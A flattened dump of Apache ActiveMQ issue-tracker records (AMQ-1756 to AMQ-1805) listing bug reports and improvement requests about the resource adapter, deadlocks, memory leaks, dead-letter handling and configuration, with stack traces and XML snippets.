texts:Add JMX properties for cursors to Queues and Durable Topic Subscribers
Message cursors can hit limits in memory usage - this enhancement will enable better debugging for runtime systems
issueID:AMQ-1756
type:Bug
changed files:ManagedSessionProxy.java
texts:Resource Adapter&#39;s ManagedSessionProxy.setMessageListener is commented out.
In the org.apache.activemq.ra.ManagedSessionProxy class the setMessageListener method doesn"t do anything;.This prevents the MessageListener from being added to the Session and that makes it kind of hard to listen to messages.It seems quite probable that this is just a quick debugging fix that accidentally made it into subversion; but if there is some reason for this that I can"t see please let me know.The code:    public void setMessageListener(MessageListener listener) throws JMSException {        getSession(); // .setMessageListener(listener);    }
issueID:AMQ-1758
type:Improvement
changed files:ActiveMQConnection.java
texts:Local variable in ActiveMQConnection.createConnectionConsumer() hides a field
The createConnectionConsumer() method creates a local ConsumerInfo instance using variable name info which happens to hide a class level field of the same name.
issueID:AMQ-1760
type:Improvement
changed files:ActiveMQSession.java
ActiveMQMessageConsumer.java
ActiveMQConnectionConsumer.java
AdvisoryConsumer.java
ActiveMQQueueBrowser.java
ClientInternalExceptionListener.java
ActiveMQConnection.java
texts:Client internal exceptions occurring during async message processing should not be propagated to Connection&#39;s ExceptionListener
I have stumbled across the following code in the ActiveMQSession.run() method:           try {                messageListener.onMessage(message);            } catch (Throwable e) {                // TODO: figure out proper way to handle error.                LOG.error("error dispatching message: ", e);                connection.onAsyncException(e);            }As the TODO points out, the way how to handle exceptions properly needs some discussion. I have come across this while working on the Resource Adapter in conjunction with GlassFish v2. When I use batching when delivering messages to an MDB and the MDB marks the current TX as rollback only (e.g. if it cannot access a database), any subsequent invocation of the MDB"s onMessage() method (actually the invocation of the wrapper around that method provided by the GlassFish app server) in the same TX will throw a javax.ejb.TransactionRolledbackLocalException in order to indicate that it is futile to invoke the bean since the TX will be rolled back anyway. This RuntimeException will now lead to the catch block being executed, i.e. the connection"s ExceptionListener will be notified eventually which in this case is the listener that the RA has registered on the connection which in turn will tear down the connection and reconnect to the broker. However, the connection never failed in the first place, i.e. reconnecting to the broker is not necessary at all.After some discussion with Rob Davies we are proposing to add another method on Connection - e.g.  setClientInternalExceptionListener() - that registers an exception  listener of internal exceptions only - like in this  ActiveMQSession.run() case.We then only pass exceptions to the ExceptionListener registered by  setExceptionListener() that directly affect the connection. The ActiveMQSession.run() method will then notify the ClientInternalExceptionListener of the runtime problem within the container.I have attached a proposed patch that adds this functionality to ActiveMQConnection and ActiveMQSession.Kai
issueID:AMQ-1761
type:Improvement
changed files:DestinationViewMBean.java
DestinationView.java
texts:Improve DestinationViewMBean so that the sendTextMessage opersation allows optional username and password
The DestinationViewMBean"s sendTextMessage() method does not provide you with the option of specifying a username and password; therefore, if authentication services have been enabled for the broker, you"re precluded from using the sendTextMessage() method.
issueID:AMQ-1763
type:Bug
changed files:
texts:Acknowledgment of Messages consumed from VirtualTopic consumer queues fails
The Message Broker throws an exception each time a client tries to acknowledge a message consumed from a  VirtualTopic consumer queue:ERROR Service                        - Async error occurred: java.lang.IllegalArgumentException: The subscription does not exist: ID:seautpc271-1314-1212495185267-0:0:1:1java.lang.IllegalArgumentException: The subscription does not exist: ID:seautpc271-1314-1212495185267-0:0:1:1        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:357)        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:470)        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:73)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:73)        at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:84)        at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:443)        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:196)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:196)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:183)        at java.lang.Thread.run(Thread.java:619)Consequently the message gets re-delivered as soon as the client connects to the queue again (and fails again on aknowledgement). Strangely enough the subscription mentioned in the exception is visible in the JMX console. I can reproduce this error every time I try to consume from VirtualTopic consumer queues.I have attached the broker configuration (which is rather minimal) and the test classes I used to trigger this error.
issueID:AMQ-1766
type:Improvement
changed files:AMQTransactionStore.java
AMQPersistenceAdapterFactory.java
HashIndex.java
AMQPersistenceAdapter.java
texts:AMQStore - enable transactions to sync write by default
Add an option parameter to enable transactions to sync write to disk by default
issueID:AMQ-1768
type:Bug
changed files:CamelEndpointLoader.java
ActiveMQComponent.java
texts:Allow configuration of ActiveMQConfiguration in ActiveMQComponent with Spring
Because ActiveMQComponent overwrites the getConfiguration() of JmsComponent and declares the return value of type ActiveMQConfiguration instead of JmsConfiguration the configuration via xml fails.Therefore the following configuration is not valid. <bean id="jmsConfig" class="org.apache.activemq.camel.component.ActiveMQConfiguration">  <property name="connectionFactory" ref="jmsConnectionFactory"/>  <property name="concurrentConsumers" value="1"/>  <property name="exceptionListener" ref="jmsExceptionListener" /></bean><bean id="activemq" class="org.apache.activemq.camel.component.ActiveMQComponent" destroy-method="stop" >  <property name="connectionFactory" ref="jmsConnectionFactory" />  <property name="taskExecutor" ref="myTaskExecutor" />  <property name="usePooledConnection" value="true" />  <property name="configuration" ref="jmsConfig"/></bean> The patch shows the changes that are necessary to allow this.
issueID:AMQ-1770
type:Bug
changed files:ActiveMQBlobMessage.java
texts:BlobUploader gets nulled out when copyMessageOnSend is set to true
You have to set the "copyMessageOnSend" option to false in order to get the upload to work for an ActiveMQBlobMessage.From a user forum thread"When the message is created with activeMQSession.createBlobMessage(File), it sets the message"s blobUploader field. When the ActiveMQBlobMessage.copy() method is called, it does not copy this field. The new message has a null blobUploader. Then, when the ActiveMQBlobMessage.onSend() gets called, it does not upload the file if the blobUploader field is null."I am assuming this to be a bug and not by design.
issueID:AMQ-1771
type:Bug
changed files:FailoverTransport.java
texts:Failover transport should always signal resume of transport
The FailoverTransport does currently not signal the initial resume of the transport (due to race condition) nor the failure (if maxReconnectAttempts is 0) and therefore we don"t know if the connection is successfully connected or not.The attached patch adds a sleep (copied from the failure processing part some lines below) that ensures that the transportListener is set and the transportListener.transportResumed() is called.
issueID:AMQ-1772
type:Improvement
changed files:BrokerService.java
texts:Call stop() if exception thrown in start()
None
issueID:AMQ-1773
type:Improvement
changed files:AbstractDeadLetterStrategy.java
texts:The default Dead Letter Strategy sends non-persistent messages that have expired to the dead letter by default
The defaults don"t make sense to me  - non-persistence should not be sent to dead letter queue by default
issueID:AMQ-1774
type:Bug
changed files:Queue.java
texts:Null pointer exception when sending expired advisory messages from a Queue
None
issueID:AMQ-1777
type:Bug
changed files:ActiveMQManagedConnection.java
texts:Access to ConnectionEventListeners in RA&#39;s ActiveMQManagedConnection is not synchronized
When the RA"s connection to the broker fails and the <i>ActiveMQManagedConnection.onException()</i> method is called, all the registered <i>ConnectionEventListener</i>s are notified.At least in Glassfish, the registered listener then calls the <i>ActiveMQManagedConnection.removeConnectionEventListener()</i> to unregister itself. This causes a <i>java.util.ConcurrentModificationException</i> to be thrown since the <i>ConnectionEventListener</i> collection is modified while the <i>onException()</i> iterates over it.Kai
issueID:AMQ-1779
type:Bug
changed files:ActiveMQConnectionConsumer.java
texts:RA does not reconnect correctly to a failed broker
The Resource Adapter does not cleanly reconnect to a failed broker: it uses stale sessions to deliver messages to an Endpoint resulting in messages not being delivered at all anymore after the connection has been re-established the code for connecting/reconnecting to the broker is not synchronized properly leading to race conditions/deadlocks in some situationsKai
issueID:AMQ-1780
type:Bug
changed files:
texts:ActiveMQ broker does not automatically reconnect if the connection to the database is lost
hiWe are noticing that after any SQL Server restart or network blip between ActiveMQ and the database, after the connection or the database comes back online activeMQ broker needs to be restarted as well i.e it doesn"t automatically re-establish connection to the database as result any message send fails because the broker is still using the stale connection to the database. Is this designed behaviour or a bug? we are using ActiveMQ 5.0.0 and the latest version of the JSQLConnect database driver: version 5.7. The database we are using is MS SQL Server 2005 Right now, in our production environment any time we have network maintenance or database restart we also have to restart the ActiveMQ broker which is not a good option for us. Also, We are using a single ActiveMQ broker and not the JDBC(Master/Slave) set up.Issue details inhttp://www.nabble.com/Database-connection-between-ActiveMQ-and-broker-td17321330s2354.htmlPlease let me know if I need to give more informationthanksjaya
issueID:AMQ-1781
type:Bug
changed files:
texts:LDAP + JAAS = NullPointerException
If an attempt is made to configure the LDAPLoginModule JAAS plugin, as per the instructions inside either of these two messages, ActiveMQ refuses to start with the NullPointerException reported below.http://osdir.com/ml/java.activemq.user/2006-05/msg00556.htmlhttp://www.nabble.com/Adding-users-on-the-fly-ACTIVEMQ-to16825211s2354.html#a16984528Caused by: javax.security.auth.login.LoginException: java.lang.NullPointerException        at java.lang.String.<init>(String.java:176)        at org.apache.activemq.jaas.LDAPLoginModule.login(LDAPLoginModule.java:134)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at javax.security.auth.login.LoginContext.invoke(LoginContext.java:769)        at javax.security.auth.login.LoginContext.access$000(LoginContext.java:186)        at javax.security.auth.login.LoginContext$4.run(LoginContext.java:683)        at java.security.AccessController.doPrivileged(Native Method)        at javax.security.auth.login.LoginContext.invokePriv(LoginContext.java:680)        at javax.security.auth.login.LoginContext.login(LoginContext.java:579)        at org.apache.activemq.security.JaasAuthenticationBroker.addConnection(JaasAuthenticationBroker.java:76)        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:88)        at org.apache.activemq.broker.TransportConnection.processAddConnection(TransportConnection.java:662)        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:86)        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:125)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:196)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:183)        at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-1788
type:Bug
changed files:AbstractRegion.java
texts:deadlock on message expiration
Detected deadlock in AMQ 5.1.0 between transport thread (removing consumer) and QueueThread (sending expired messages to DLQ): Name: VMTransport State: BLOCKED on java.lang.Object@7176e6 owned by: QueueThread:queue://some_queue Total blocked: 31  Total waited: 525 Stack trace: at org.apache.activemq.broker.region.PrefetchSubscription.remove(PrefetchSubscription.java:463) at org.apache.activemq.broker.region.Queue.removeSubscription(Queue.java:300)  locked java.util.ArrayList@14aa305at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:313)  locked java.lang.Object@da6a6bat org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:400) at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:113) at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:222) at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:113) at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:120) at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:552) at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:64) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:205) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) java.lang.Thread.run(Thread.java:619) Name: QueueThread:queue://some_queue State: BLOCKED on java.lang.Object@da6a6b owned by: VMTransport Total blocked: 107  Total waited: 1.363 Stack trace: at org.apache.activemq.broker.region.AbstractRegion.lookup(AbstractRegion.java:372) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:336) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:125) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:132) at org.apache.activemq.util.BrokerSupport.resend(BrokerSupport.java:56) at org.apache.activemq.broker.region.RegionBroker.sendToDeadLetterQueue(RegionBroker.java:712) at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:257) at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:257) at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:257) at org.apache.activemq.broker.MutableBrokerFilter.sendToDeadLetterQueue(MutableBrokerFilter.java:270) at org.apache.activemq.broker.region.RegionBroker.messageExpired(RegionBroker.java:679) at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:496)  locked java.lang.Object@7176e6at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:144) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:936)  locked org.apache.activemq.broker.region.Queue$2@e02b5at org.apache.activemq.thread.DeterministicTaskRunner.runTask(DeterministicTaskRunner.java:84) at org.apache.activemq.thread.DeterministicTaskRunner$1.run(DeterministicTaskRunner.java:41) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-1790
type:Bug
changed files:Topic.java
Queue.java
BaseDestination.java
texts:Memory leak in broker - Temporary Queue related (fix proposal included)
ActiveMQ broker leaks memory when using temp queues.This is critical for projects that use spring based synchronous messaging because each message creates & destroys new temp queue,however because of the leak they are not completely cleaned up resulting in OutOfMemory exception.First these are the classes that are leaked:org.apache.activemq.usage.MemoryUsageorg.apache.activemq.management.PollCountStatisticImplorg.apache.activemq.usage.DefaultUsageCapacityCause:org.apache.activemq.broker.region.BaseDestination is a base class for queues and by extension TempQueues.When TempQueue is created it will call BaseDestination constructor which will allocate some memory usage and statistics objects.However, the cleanup operation is missing - when TempQueue is destroyed these resources are not removed, and because these objects form a tree with the root being the root SystemUsage object they are never deleted.Solution:BaseDestination should implement dispose() method - this method is already defined in Destination interface but not implemented in BaseDestination.This method should cleanup all the resources allocated during it"s creation. For example, see Queue.dispose().
issueID:AMQ-1795
type:Bug
changed files:
texts:in use data files removed from data store under load
Under load, I see the error below.the problem is that org.apache.activemq.store.amq.AMQPersistenceAdapter.cleanup() does not capture all of the in use files.I have made some changes that improves the situation but there is still a window, that seems to be related to spooling messages when a memory limit is reached.2008-06-12 14:55:16,689 &#91;main           &#93; INFO  BrokerService                  - Using Persistence Adapter: AMQPersistenceAdapter(activemq-datalocalhost)2008-06-12 14:55:16,704 &#91;main           &#93; INFO  AMQPersistenceAdapter          - AMQStore starting using directory: activemq-datalocalhost2008-06-12 14:55:17,361 &#91;main           &#93; INFO  AMQPersistenceAdapter          - Journal deleted: 2008-06-12 14:55:17,361 &#91;main           &#93; INFO  KahaStore                      - Kaha Store successfully deleted data directory activemq-datalocalhostkr-storedata2008-06-12 14:55:17,392 &#91;main           &#93; INFO  KahaStore                      - Kaha Store successfully deleted data directory activemq-datalocalhostkr-storestate2008-06-12 14:55:17,392 &#91;main           &#93; INFO  KahaStore                      - Kaha Store using data directory activemq-datalocalhostkr-storestate2008-06-12 14:55:17,470 &#91;main           &#93; INFO  AMQPersistenceAdapter          - Active data files: []2008-06-12 14:55:17,705 &#91;main           &#93; INFO  BrokerService                  - ActiveMQ null JMS Message Broker (localhost) is starting2008-06-12 14:55:17,705 &#91;main           &#93; INFO  BrokerService                  - For help or more information please see: http://activemq.apache.org/2008-06-12 14:55:17,814 &#91;JMX connector  &#93; INFO  ManagementContext              - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi2008-06-12 14:55:17,924 &#91;main           &#93; INFO  KahaStore                      - Kaha Store using data directory activemq-datalocalhostkr-storedata2008-06-12 14:55:17,939 &#91;main           &#93; INFO  TransportServerThreadSupport   - Listening for connections at: tcp://salthill:616162008-06-12 14:55:17,939 &#91;main           &#93; INFO  TransportConnector             - Connector Default Started2008-06-12 14:55:17,939 &#91;main           &#93; INFO  BrokerService                  - ActiveMQ JMS Message Broker (localhost, ID:salthill-2790-1213278917752-0:0) started2008-06-12 14:55:17,939 &#91;main           &#93; INFO  MissingDataFileTest            - Starting broker..2008-06-12 14:55:58,516 &#91;age Thread Pool&#93; ERROR AsyncDataManager               - Looking for key 551 but not found in fileMap: {1014=data-1014 number = 1014 , length = 1960 refCount = 6, 607=data-607 number = 607 , length = 1266 refCount = 1, 928=data-928 number = 928 , .. .. 622 , length = 1352 refCount = 2, 328=data-328 number = 328 , length = 1266 refCount = 1, 256=data-256 number = 256 , length = 1264 refCount = 1, 92=data-92 number = 92 , length = 1264 refCount = 1, 404=data-404 number = 404 , length = 1266 refCount = 1}2008-06-12 14:55:58,563 &#91;age Thread Pool&#93; ERROR AbstractStoreCursor            - Failed to fill batchjava.io.IOException: Failed to read to journal for: offset = 0, file = 551, size = 1, type = 0. Reason: java.io.IOException: Could not locate data file data-551 at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:33) at org.apache.activemq.store.amq.AMQPersistenceAdapter.createReadException(AMQPersistenceAdapter.java:635) at org.apache.activemq.store.amq.AMQPersistenceAdapter.readCommand(AMQPersistenceAdapter.java:521) at org.apache.activemq.store.amq.AMQMessageStore.getMessage(AMQMessageStore.java:432) at org.apache.activemq.store.amq.RecoveryListenerAdapter.recoverMessageReference(RecoveryListenerAdapter.java:54) at org.apache.activemq.store.kahadaptor.KahaReferenceStore.recoverReference(KahaReferenceStore.java:82) at org.apache.activemq.store.kahadaptor.KahaReferenceStore.recoverNextMessages(KahaReferenceStore.java:120) at org.apache.activemq.store.amq.AMQMessageStore.recoverNextMessages(AMQMessageStore.java:530) at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:75) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:188) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.onUsageChanged(AbstractStoreCursor.java:157) at org.apache.activemq.usage.Usage$1.run(Usage.java:266) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675) at java.lang.Thread.run(Thread.java:595)Caused by: java.io.IOException: Could not locate data file data--551 at org.apache.activemq.kaha.impl.async.AsyncDataManager.getDataFile(AsyncDataManager.java:303) at org.apache.activemq.kaha.impl.async.AsyncDataManager.read(AsyncDataManager.java:613) at org.apache.activemq.store.amq.AMQPersistenceAdapter.readCommand(AMQPersistenceAdapter.java:518) ... 12 more2008-06-12 14:55:58,563 &#91;age Thread Pool&#93; ERROR AbstractStoreCursor            - Failed to fill batch java.lang.RuntimeException: java.io.IOException: Failed to read to journal for: offset = 0, file = 551, size = 1, type = 0. Reason: java.io.IOException: Could not locate data file data-551 at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:191) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.onUsageChanged(AbstractStoreCursor.java:157) at org.apache.activemq.usage.Usage$1.run(Usage.java:266) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675) at java.lang.Thread.run(Thread.java:595)Caused by: java.io.IOException: Failed to read to journal for: offset = 0, file = 551, size = 1, type = 0. Reason: java.io.IOException: Could not locate data file data-551 at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:33) at org.apache.activemq.store.amq.AMQPersistenceAdapter.createReadException(AMQPersistenceAdapter.java:635) at org.apache.activemq.store.amq.AMQPersistenceAdapter.readCommand(AMQPersistenceAdapter.java:521) at org.apache.activemq.store.amq.AMQMessageStore.getMessage(AMQMessageStore.java:432) at org.apache.activemq.store.amq.RecoveryListenerAdapter.recoverMessageReference(RecoveryListenerAdapter.java:54) at org.apache.activemq.store.kahadaptor.KahaReferenceStore.recoverReference(KahaReferenceStore.java:82) at org.apache.activemq.store.kahadaptor.KahaReferenceStore.recoverNextMessages(KahaReferenceStore.java:120) at org.apache.activemq.store.amq.AMQMessageStore.recoverNextMessages(AMQMessageStore.java:530) at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:75) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:188) ... 5 moreCaused by: java.io.IOException: Could not locate data file data--551 at org.apache.activemq.kaha.impl.async.AsyncDataManager.getDataFile(AsyncDataManager.java:303) at org.apache.activemq.kaha.impl.async.AsyncDataManager.read(AsyncDataManager.java:613) at org.apache.activemq.store.amq.AMQPersistenceAdapter.readCommand(AMQPersistenceAdapter.java:518) ... 12 more2008-06-12 15:00:18,531 &#91;main           &#93; INFO  BrokerService                  - ActiveMQ Message Broker (localhost, ID:salthill-2790-1213278917752-0:0) is shutting down2008-06-12 15:00:20,438 &#91;main           &#93; INFO  TransportConnector             - Connector Default Stopped2008-06-12 15:00:20,641 &#91;main           &#93; INFO  BrokerService                  - ActiveMQ JMS Message Broker (localhost, ID:salthill-2790-1213278917752-0:0) stopped
issueID:AMQ-1796
type:Bug
changed files:
texts:expired messages not moved to DLQ on trunk (5.2)
Expired messages (transient) are not moved to DLQ on trunk (667098).Following tests are failing:Running org.apache.activemq.broker.policy.IndividualDeadLetterTestTests run: 4, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 4.172 sec <<< FAILURE!Running org.apache.activemq.broker.policy.MessageListenerDeadLetterTestTests run: 4, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 9.469 sec <<< FAILURE!Running org.apache.activemq.broker.policy.DeadLetterTestTests run: 4, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 4.359 sec <<< FAILURE!Running org.apache.activemq.camel.CamelJmsTestTests run: 2, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 2.203 sec <<< FAILURE!Running org.apache.activemq.broker.policy.IndividualDeadLetterViaXmlTestTests run: 4, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 4.734 sec <<< FAILURE!
issueID:AMQ-1797
type:Bug
changed files:KahaTopicReferenceStore.java
AMQPersistenceAdapter.java
texts:persistent messages for durable subscribers are not purged from disc storage
I have some problems with multiple durable subscribers while persistent delivery is used.Message should be deleted from disc storage (periodically) after all interested subscribers have received it. In case there was one durable subscriber everything woks just fine. However when I tested this scenerio with two durable subscribers on topic,  the messages were never deleted (disc usage is continously consumed and never purged). Test case description:-using default activemq.xml configuration file from binary distribution -TopicConsumers.java creates two separetes durable consumers-textMessageFile.txt is file which text is sent by producer (place it on classpath)Result:-all messages there were send were also received by both subscribers-after more then 100k messages data directory is about 1GB. -restarting activemq with so big persistent storage takes very long time
issueID:AMQ-1799
type:Bug
changed files:StoreDurableSubscriberCursor.java
texts:javax.jms.JMSException: java.util.ConcurrentModificationException in StoreDurableSubscriberCursor
javax.jms.JMSException: java.util.ConcurrentModificationException at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1201) at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1754) at org.apache.activemq.ActiveMQMessageConsumer.<init>(ActiveMQMessageConsumer.java:219) at org.apache.activemq.ActiveMQTopicSubscriber.<init>(ActiveMQTopicSubscriber.java:117) at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1164) at org.apache.activemq.pool.PooledSession.createDurableSubscriber(PooledSession.java:233) at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.createConsumer(AbstractPollingMessageListenerContainer.java:429) at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.createListenerConsumer(AbstractPollingMessageListenerContainer.java:216) at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.doReceiveAndExecute(AbstractPollingMessageListenerContainer.java:297) at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:254) at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:871) at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:811) at java.lang.Thread.run(Thread.java:595)Caused by: java.util.ConcurrentModificationException at java.util.LinkedList$ListItr.checkForComodification(LinkedList.java:617) at java.util.LinkedList$ListItr.next(LinkedList.java:552) at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.setMaxAuditDepth(StoreDurableSubscriberCursor.java:284) at org.apache.activemq.broker.region.DurableTopicSubscription.activate(DurableTopicSubscription.java:108) at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:105) at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:383) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:85) at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:83) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:85) at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:92) at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:529) at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:345) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:293) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:196) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:183) ... 1 more
issueID:AMQ-1801
type:Task
changed files:
texts:Extract camel component in its own module
None
issueID:AMQ-1802
type:Task
changed files:
texts:Extract activemq connection pool in its own module
None
issueID:AMQ-1803
type:Bug
changed files:LocalBrokerFacade.java
texts:MirroredQueue cannot be cast to Queue when Purging Mirrored Queue
We used MirroredQueues so that we can monitor what"s going on using a simple Topic client we wrote. When we click "Purge" on the queue in the web admin interface, we get a Java exception: org.apache.activemq.broker.region.virtual.MirroredQueue$1 cannot be cast to org.apache.activemq.broker.region.Queue. We are able to delete the queue, but then our listener classes do not auto-reconnect for up to 5 minutes (our own code for that to work around issues with ActiveMQ.Net bindings).
issueID:AMQ-1804
type:Improvement
changed files:ActiveMQConnectionFactory.java
texts:ConnectionFactory classes should have XBean support
It would be nice to have certain objects deriving from javax.jms.ConnectionFactory to provide XBean binding support.  This would really clean up xbean configurations utilizing ActiveMQ connection factories.current<bean id="pooledFactory" class="org.apache.activemq.pool.PooledConnectionFactory" destroy-method="stop">   <property name="connectionFactory">      <bean class="org.apache.activemq.ActiveMQConnectionFactory">         <property name="brokerURL">            <value>tcp://localhost:61616</value>         </property>      </bean>   </property></bean>vsimproved<pooledConnectionFactory id="pooledFactory" destroy-method="stop" connectionFactory="#connectionFactory"/><connectionFactory id="connectionFactory" brokerURL="tcp://localhost:61616"/>
issueID:AMQ-1805
type:Bug
changed files:AsyncDataManager.java
texts:Persistent message leak when broker run out of disk space
